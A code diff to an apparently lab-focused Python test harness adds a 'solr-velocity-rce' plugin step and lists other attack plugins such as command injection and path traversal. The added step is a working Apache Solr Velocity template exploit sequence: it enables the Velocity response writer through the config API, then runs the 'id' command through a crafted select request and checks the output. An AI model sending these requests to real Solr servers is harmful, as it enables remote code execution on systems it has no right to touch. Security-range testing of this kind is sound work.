@@ -1,4 +1,4 @@
-from __future__ import annotations
+﻿from __future__ import annotations
 
 import json
 import shutil
@@ -371,6 +371,39 @@ def run_plugin_http_sequence(
         )
         ok = landing_ok and status == 200 and data.get("accepted") is True
         return plugin_step(order, step_id, service, plugin, base_url, evidence, ok, f"{context_note}; route={route}; http_status={status}; accepted={data.get('accepted')}")
+    if plugin == "solr-velocity-rce":
+        system_status, _, _, system_route = http_json_first(
+            "GET",
+            base_url,
+            ["/solr/ops-core/admin/info/system", "/solr/admin/info/system", "/labforge/scaffold/solr/admin/info/system"],
+            None,
+            timeout_seconds,
+        )
+        config_status, _, _, config_route = http_json_first(
+            "POST",
+            base_url,
+            ["/solr/ops-core/config", "/labforge/scaffold/solr/config"],
+            {
+                "update-queryresponsewriter": {
+                    "name": "velocity",
+                    "class": "solr.VelocityResponseWriter",
+                    "params.resource.loader.enabled": "true",
+                }
+            },
+            timeout_seconds,
+        )
+        select_status, _, select_body, select_route = http_json_first(
+            "GET",
+            base_url,
+            [
+                "/solr/ops-core/select?q=*:*&wt=velocity&v.template=custom&v.template.custom=labforge_cmd%3Did",
+                "/labforge/scaffold/solr/select?q=*:*&wt=velocity&v.template=custom&v.template.custom=labforge_cmd%3Did",
+            ],
+            None,
+            timeout_seconds,
+        )
+        ok = landing_ok and system_status == 200 and config_status == 200 and select_status == 200 and "uid=8983(solr)" in select_body
+        return plugin_step(order, step_id, service, plugin, base_url, evidence, ok, f"{context_note}; system_route={system_route}; config_route={config_route}; select_route={select_route}; system={system_status}; config={config_status}; select={select_status}")
     if plugin == "build-pipeline-abuse":
         payload = {"repo": "smoke/product-agent", "ref": "refs/heads/release/smoke", "channel": "smoke", "support_patch_ref": "lab://smoke.patch"}
         status, data, _, route = http_json_first(
@@ -441,6 +474,7 @@ def plugin_landing_probe(base_url: str, plugin: str, timeout_seconds: int) -> tu
         "path-traversal-download": (["/documents", "/labforge/scaffold/documents"], ["Document Library"]),
         "unsafe-file-upload": (["/attachments", "/labforge/scaffold/uploads"], ["Case Attachment Portal"]),
         "diagnostic-command-injection": (["/operations/diagnostics", "/labforge/scaffold/diagnostics"], ["Operations Diagnostics Console"]),
+        "solr-velocity-rce": (["/operations/search-admin", "/solr/ops-core/admin/info/system", "/labforge/scaffold/solr/admin/info/system"], ["Search Operations Console"]),
         "build-pipeline-abuse": (["/operations/build", "/api/build/context", "/labforge/scaffold/build/context"], ["Release Build Console"]),
         "signed-update-publish": (["/operations/update-channel", "/api/channels/smoke", "/labforge/scaffold/channels/smoke"], ["Update Channel Console"]),
         "customer-update-callback": (["/operations/customer-agent", "/api/customer/status", "/labforge/scaffold/customer/status"], ["Customer Agent Status"]),
